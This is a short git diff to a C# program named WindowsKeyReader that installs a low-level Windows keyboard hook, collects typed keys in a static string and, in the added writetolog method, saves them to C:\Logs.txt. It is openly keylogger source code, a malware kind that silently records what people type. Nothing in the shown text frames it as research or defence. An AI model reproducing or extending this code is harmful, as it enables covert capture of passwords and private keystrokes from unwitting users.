@@ -83,7 +83,6 @@ namespace WindowsKeyReader
         }
         //ricus comment
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-        string line = "";
         private static string logs = "";// skryf alles wat mens log
         //string logs = "";
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
@@ -117,8 +116,16 @@ namespace WindowsKeyReader
                 ////////////////////////////////////////////////////////////////
                 //Console.WriteLine((Keys)vkCode);
             }
-
+           
             return CallNextHookEx(hook, nCode, wParam, lParam);
+        }
+
+        public void writetolog()
+        {
+            StreamWriter writer = new StreamWriter("C:\\Logs.txt");
+            writer.WriteLine(logs);
+            writer.Close();
+
         }
 
         [DllImport("kernel32.dll")]
